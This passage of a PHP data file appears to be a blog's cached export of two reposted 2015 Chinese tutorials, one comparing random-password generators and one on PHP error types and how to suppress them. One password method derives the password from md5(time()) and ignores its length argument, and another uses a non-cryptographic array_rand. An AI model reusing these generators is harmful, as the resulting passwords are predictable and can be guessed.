&#39;P&#39;,&nbsp;&#39;Q&#39;,&nbsp;&#39;R&#39;,&nbsp;&#39;S&#39;,&nbsp;&#39;T&#39;,&nbsp;&#39;U&#39;,&nbsp;&#39;V&#39;,&nbsp;&#39;W&#39;,&nbsp;&#39;X&#39;,&nbsp;&#39;Y&#39;,&#39;Z&#39;,
&#39;0&#39;,&nbsp;&#39;1&#39;,&nbsp;&#39;2&#39;,&nbsp;&#39;3&#39;,&nbsp;&#39;4&#39;,&nbsp;&#39;5&#39;,&nbsp;&#39;6&#39;,&nbsp;&#39;7&#39;,&nbsp;&#39;8&#39;,&nbsp;&#39;9&#39;,&nbsp;&#39;!&#39;,
&#39;@&#39;,&#39;#&#39;,&nbsp;&#39;$&#39;,&nbsp;&#39;%&#39;,&nbsp;&#39;^&#39;,&nbsp;&#39;&amp;&#39;,&nbsp;&#39;*&#39;,&nbsp;&#39;(&#39;,&nbsp;&#39;)&#39;,&nbsp;&#39;-&#39;,&nbsp;&#39;_&#39;,
&#39;[&#39;,&nbsp;&#39;]&#39;,&nbsp;&#39;{&#39;,&nbsp;&#39;}&#39;,&nbsp;&#39;&lt;&#39;,&nbsp;&#39;&gt;&#39;,&nbsp;&#39;~&#39;,&nbsp;&#39;`&#39;,&nbsp;&#39;+&#39;,&nbsp;&#39;=&#39;,&nbsp;&#39;,&#39;,
&#39;.&#39;,&nbsp;&#39;;&#39;,&nbsp;&#39;:&#39;,&nbsp;&#39;/&#39;,&nbsp;&#39;?&#39;,&nbsp;&#39;|&#39;);

//&nbsp;在&nbsp;$chars&nbsp;中随机取&nbsp;$length&nbsp;个数组元素键名
$keys&nbsp;=&nbsp;array_rand($chars,&nbsp;$length);
$password&nbsp;=&nbsp;&#39;&#39;;
for($i&nbsp;=&nbsp;0;&nbsp;$i&nbsp;&lt;&nbsp;$length;&nbsp;$i++)&nbsp;{
　　//&nbsp;将&nbsp;$length&nbsp;个数组元素连接成字符串
　　$password&nbsp;.=&nbsp;$chars[$keys[$i]];
}

return&nbsp;$password;

}</pre><h2 id=\\"title-3\\">方法四：</h2><p>本方法是本文被蓝色理想转载后，一名网友提供的一个新方法，算法简单，代码简短，只是因为md5()函数的返回值的缘故，生成的密码只包括字母和数字，不过也算是一个不错的方法。算法思想：</p><p>1、time() 获取当前的 Unix 时间戳</p><p>2、将第一步获取的时间戳进行 md5() 加密</p><p>3、将第二步加密的结果，截取 n 位即得想要的密码</p><pre class=\\"brush:php;toolbar:false\\">function&nbsp;get_password(&nbsp;$length&nbsp;=&nbsp;8&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$str&nbsp;=&nbsp;substr(md5(time()),&nbsp;0,&nbsp;6);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$str;
}</pre><h2 id=\\"time-contrast\\">时间效率对比</h2><p>我们使用以下PHP代码，计算上面的 4 个随机密码生成函数生成 6 位密码的运行时间，进而对他们的时间效率进行一个简单的对比。</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
function&nbsp;getmicrotime()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;list($usec,&nbsp;$sec)&nbsp;=&nbsp;explode(&quot;&nbsp;&quot;,microtime());
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;((float)$usec&nbsp;+&nbsp;(float)$sec);
}
//&nbsp;记录开始时间
$time_start&nbsp;=&nbsp;getmicrotime();
//&nbsp;这里放要执行的PHP代码，如:
//&nbsp;echo&nbsp;create_password(6);
//&nbsp;记录结束时间
$time_end&nbsp;=&nbsp;getmicrotime();
$time&nbsp;=&nbsp;$time_end&nbsp;-&nbsp;$time_start;
//&nbsp;输出运行总时间
echo&nbsp;&quot;执行时间&nbsp;$time&nbsp;seconds&quot;;
?&gt;</pre><p>最终得出的结果是：</p><p>方法一：9.8943710327148E-5 秒</p><p>方法二：9.6797943115234E-5 秒</p><p>方法三：0.00017499923706055 秒</p><p>方法四：3.4093856811523E-5 秒</p><p>可以看出方法一和方法二的执行时间都差不多，方法四运行时间最短，而方法三的运行时间稍微长点。</p><p>&nbsp;</p><p>文章转自：http://www.php100.com/html/it/biancheng/2015/0422/8926.html</p><p><br/></p>',
            'keyword' => 'php,随机,密码',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 10:10:37',
          ),
          84 => 
          array (
            'id' => '1',
            'uid' => '1',
            'title' => '（转）PHP错误类型及屏蔽方法',
            'content' => '<p>程序只要在运行，就免不了会出现错误，错误很常见，比如Error，Notice，Warning等等。之前我们介绍过《<a href=\\"http://www.php100.com/html/dujia/2015/0119/8411.html\\" target=\\"_blank\\" data-mce-href=\\"http://www.php100.com/html/dujia/2015/0119/8411.html\\">易犯的PHP小错误及相应分析</a>》《<a href=\\"http://www.php100.com/html/dujia/2015/0115/8381.html\\" target=\\"_blank\\" data-mce-href=\\"http://www.php100.com/html/dujia/2015/0115/8381.html\\">为开发者准备的10款错误报告和追踪工具</a>》，这篇文章具体说一下PHP的错误类型和屏蔽方法。在PHP中，主要有以下3种错误类型。<br/><br/><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><strong>1.&nbsp;注意（Notices）</strong><br/>这些都是比较小而且不严重的错误，比如去访问一个未被定义的变量。通常，这类的错误是不提示给用户的，但有时这些错误会影响到运行的结果。<br/><br/><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><strong>2.&nbsp;警告（Warnings）</strong><br/>这就是稍微严重一些的错误了，比如想要包含include()一个本身不存在的文件。这样的错误信息会提示给用户，但不会导致程序终止运行。<br/><br/><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><strong>3.&nbsp;致命错误（Fatal&nbsp;errors）</strong><br/>这些就是严重的错误，比如你想要初始化一个根本不存在的类的对象，或调用一个不存在的函数，这些错误会导致程序停止运行，PHP也会把这些错误展现给用户。</span></span></span></span></p><p><span style=\\"font-size: 14px;\\" data-mce-style=\\"font-size: 14px;\\"><strong>不同的错误种类包括：</strong><br/><br/>E_ERROR：通常会显示出来，也会中断程序执行。<br/>E_WARNING：通常都会显示出来，但不会中断程序的执行。<br/>E_NOTICE：在脚本正常运行下发生的代码错误。<br/>E_PARSE：语法解析错误。<br/><br/>E_CORE_ERROR：在PHP启动时发生的致命错误。<br/>E_CORE_WARNING：报告在PHP启动时发生的非致命性错误。<br/>E_COMPILE_ERROR：编译时发生的致命错误，指出脚本的错误。<br/><br/>E_USER_ERROR：用户产生的错误信息。<br/>E_USER_WARNING：用户产生的警告信息。<br/>E_USER_NOTICE：用户引发的注意消息。<br/><br/>E_STRICT：编码标准化警告，运行时发生的错误。<br/>E_RECOVERABLE_ERROR：接近致命的运行时错误，若未被捕获则视同E_ERROR。<br/>E_ALL：捕获所有的错误和警告。<br/><br/>&nbsp;</span></p><h2><span style=\\"color: #000000;\\" data-mce-style=\\"color: #000000;\\">屏蔽PHP错误提示</span></h2><p><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><strong>方法一：</strong>在有可能出错的函数前加@,然后or&nbsp;die(&quot;&quot;)&nbsp;<br/>如：&nbsp;<br/>@mysql_connect(...)&nbsp;or&nbsp;die(&quot;Database&nbsp;Connect&nbsp;Error&quot;)<br/><br/><strong>方法二：</strong>编辑php.ini&nbsp;，查找&quot;display_errors&nbsp;=&quot;&nbsp;，将“=”后面的值改为&quot;off。<br/><br/><strong>方法三：</strong>在php脚本前加error_reporting(0)，屏蔽所有错误提示。<br/>其中，error_reporting&nbsp;配置错误信息回报的等级。<br/><br/>语法：int&nbsp;error_reporting(int&nbsp;[level]);<br/>返回值：整数<br/>函数种类：PHP&nbsp;系统功能</span></span></span></p><p>&nbsp;</p><p><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><span style=\\"color: #b22222;\\" data-mce-style=\\"color: #b22222;\\"><span style=\\"color: #000000;\\" data-mce-style=\\"color: #000000;\\">原文：<a href=\\"http://www.ecomspark.com/what-are-the-different-types-of-errors-in-php/\\" target=\\"_blank\\" data-mce-href=\\"http://www.ecomspark.com/what-are-the-different-types-of-errors-in-php/\\">http://www.ecomspark.com/what-are-the-different-types-of-errors-in-php/</a></span></span></span></span></p><p><br/></p>',
            'keyword' => 'php,错误,屏蔽',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 09:51:45',
          ),
        ),
        'month' => '09',
        'num' => '85',
        'year' => '2015',
      ),
    ),
  ),
); 
?>